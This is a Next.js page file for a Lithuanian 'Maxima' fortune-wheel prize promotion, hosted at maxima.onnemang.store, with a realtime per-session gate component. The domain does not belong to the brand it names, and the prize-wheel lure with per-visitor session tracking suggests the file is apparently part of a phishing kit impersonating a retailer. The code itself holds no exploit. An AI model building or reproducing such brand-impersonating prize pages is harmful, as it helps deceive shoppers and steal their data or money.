import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { WheelClient } from "./wheel-client";

export const dynamic = 'force-dynamic';

const SITE_URL = "https://maxima.onnemang.store";
const OG_IMAGE_ABSOLUTE = `${SITE_URL}/og-image.jpg`;

export const metadata = {
  title: "Maxima — Laimės Ratas",
  description:
    "Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
  icons: {
    icon: "/favicon.ico",
  },
  metadataBase: new URL(SITE_URL),
  alternates: {
    canonical: "/wheel",
  },
  openGraph: {
    type: "website",
    locale: "lt_LT",
    url: SITE_URL,
    siteName: "Maxima Laimės Ratas",
    title: "Maxima — Laimės Ratas",
    description:
      "Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
    images: [
      {
        url: OG_IMAGE_ABSOLUTE,
        secureUrl: OG_IMAGE_ABSOLUTE,
        width: 1200,
        height: 630,
        alt: "Maxima Laimės Ratas",
        type: "image/jpeg",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: "Maxima — Laimės Ratas",
    description:
      "Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
    images: [OG_IMAGE_ABSOLUTE],
  },
};

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function WheelPage({ searchParams }: Props) {
  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: await searchParams,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <WheelClient sessionId={sessionId} routeSessionId={routeSessionId} />
    </>
  );
}
